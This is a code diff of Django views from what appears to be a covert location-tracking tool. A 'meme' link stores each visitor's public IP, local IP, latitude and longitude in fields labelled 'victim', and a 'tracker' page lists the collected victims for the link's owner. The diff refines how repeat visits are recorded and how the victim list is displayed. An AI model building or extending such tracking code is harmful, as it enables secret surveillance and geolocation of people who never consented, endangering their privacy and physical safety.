@@ -98,7 +98,7 @@ def index(request):
           
           lats = ip['ipstackdata']['latitude']
           lons = ip['ipstackdata']['longitude']
-          print(lats, lons)
+          
           ip['gmap3']=heat_map([lats],[lons],googlemapapikey)
 
           ip['torrentdata'] = GetTorrent(request_data)
@@ -373,13 +373,13 @@ def meme(request, username):
     secret="".join(["abcdefghijklmnopqrstuvwxyz"[("abcdefghijklmnopqrstuvwxyz".find(c)+13)%26] for c in secret])
     user = User.objects.filter(username=secret).first()
 
-    if user.profile.victimpublicip == '': # Assigning values for the first time
+    if user.profile.victimpublicip == '' : # Assigning values for the first time
       user.profile.victimpublicip = publicip
       user.profile.victimlocip = localip
       user.profile.victimlatitude = viclatitude
       user.profile.victimlongitude = viclongitude
 
-    else:
+    elif publicip not in user.profile.victimpublicip or localip not in user.profile.victimlocip:
 
       if publicip not in user.profile.victimpublicip: #Checking whether the Public Ip already exists in DB
         user.profile.victimpublicip += ','+publicip # Appending values from 2nd time
@@ -414,10 +414,10 @@ def tracker(request):
     url = "http://"+str(request.META['HTTP_HOST'])+'/meme/' + str(secret)
 
     # Fetching values from DB as list
-
+    
     victimpublicip = user.profile.victimpublicip
     victimpublicip = victimpublicip.split(",")
- 
+    
     victimlocip = user.profile.victimlocip
     victimlocip = victimlocip.split(",")
 
@@ -426,11 +426,12 @@ def tracker(request):
 
     viclongitude = user.profile.victimlongitude
     viclongitude = viclongitude.split(",")
-
-    if victimpublicip != ['']:
-
-      return render(request, 'tracker.html', {'victimpublicip':victimpublicip, 'victimlocip':victimlocip,
-                                            'viclatitude':viclatitude,'viclongitude':viclongitude, 'url':url})
+    victim=[]
+    for i in range(len(viclatitude)):
+      victim.append([victimpublicip[i],victimlocip[i],viclatitude[i],viclongitude[i]])
+    print(victim)
+    if victimpublicip != []:
+      return render(request, 'tracker.html', {'victim':victim,'url':url})
 
     else:
 
